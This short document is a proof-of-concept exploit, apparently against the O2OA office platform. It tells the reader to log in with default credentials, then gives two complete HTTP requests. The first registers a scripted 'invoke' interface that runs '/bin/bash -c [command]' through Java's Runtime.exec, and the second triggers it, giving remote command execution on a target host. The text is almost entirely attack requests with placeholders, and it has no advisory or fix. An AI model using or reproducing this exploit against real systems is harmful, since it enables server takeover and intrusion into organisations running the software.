Default User/Password login,get your authorization

1.Add the Interface 
```
POST /x_program_center/jaxrs/invoke?v=6.3 HTTP/1.1
Host: [your target host]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: [your authorization]
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 475

{"name":"abc","id":"abc","alias":"","description":"","isNewInvoke":true,"text":"/\n\nvar s = [3];\ns[0] = \"/bin/bash\";\ns[1] = \"-c\";\ns[2] = \"[command]\";\nvar p = java.lang.Runtime.getRuntime().exec(s);\nvar sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");\nvar result = sc.hasNext() ? sc.next() : \"\";\nsc.close();","enableToken":false,"enable":true,"remoteAddrRegex":"","lastStartTime":"","lastEndTime":"","validated":true}
```

2.invoke the command
```
POST /x_program_center/jaxrs/invoke/abc/execute?v=6.3 HTTP/1.1
Host: [your target host]
Content-Length: 0
Accept: text/html,application/json,*/*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN
Authorization: [your authorization]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://[your target host]
Referer: http://[your target host]/x_desktop/index.html
Accept-Encoding: gzip, deflate
Cookie: 
Connection: close
```
